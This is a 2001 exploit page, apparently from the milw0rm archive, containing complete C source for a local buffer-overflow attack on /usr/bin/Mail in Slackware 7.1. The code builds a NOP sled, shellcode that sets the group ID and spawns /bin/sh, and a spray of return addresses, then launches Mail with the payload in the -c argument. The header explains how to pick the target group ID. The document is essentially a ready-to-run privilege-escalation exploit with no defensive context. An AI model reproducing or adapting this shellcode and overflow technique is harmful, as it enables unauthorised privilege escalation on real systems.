<html><head><title>Slackware 7.1 /usr/bin/mail Local Exploit</title></head><pre>/*
   Slackware 7.1 /usr/bin/Mail Exploit give gid=1 ( bin )
   if /usr/bin/Mail is setgid but it is not setgid,
   setuid for default.

  tested on my box ( sl 7.1 )
  crazy exploited by kengz.
  GID.... \x01 = 1 (bin)
          \x02 = 2 ,
          \x03 = 3 ,
     ...  \x0a = 10
          \x0b = 11
    ....
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#define GID    &quot;\x03&quot;

int main(int argc, char **argv) {
  char shellcode[] =
    &quot;\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1&quot;GID&quot;\x31&quot;
    &quot;\xc0\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3&quot;GID&quot;\xb1&quot;
     GID&quot;\x31\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76&quot;
    &quot;\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89&quot;
    &quot;\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89&quot;
    &quot;\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

  char buf2[10000];
  char buffer[15000];
  char nop[8000];
  char *p, *q;
  long ret=0xbfffffff;
  int len, offset = 0, i,j,k,ii;
  ret = ret - 5000;

  for(k=0; k&lt;2000; k+=4)
    *(long *)&amp;buf2[k] = ret;

  for(k=0;k&lt;7000;k++){
    strcat(nop,&quot;\x90&quot;);
  }
  snprintf(buffer,12000,&quot;%s%s%s&quot;,nop,shellcode,buf2);
  printf(&quot;Crazy Mail sploit by kengz \n&quot;);
  printf(&quot;Hit    '  .  ' to go \n&quot;);
  execl(&quot;/usr/bin/Mail&quot;,&quot;Mail&quot;,&quot;x&quot;,&quot;-s&quot;,&quot;x&quot;,&quot;-c&quot;,buffer,0);
}


// milw0rm.com [2001-03-03]</pre></html>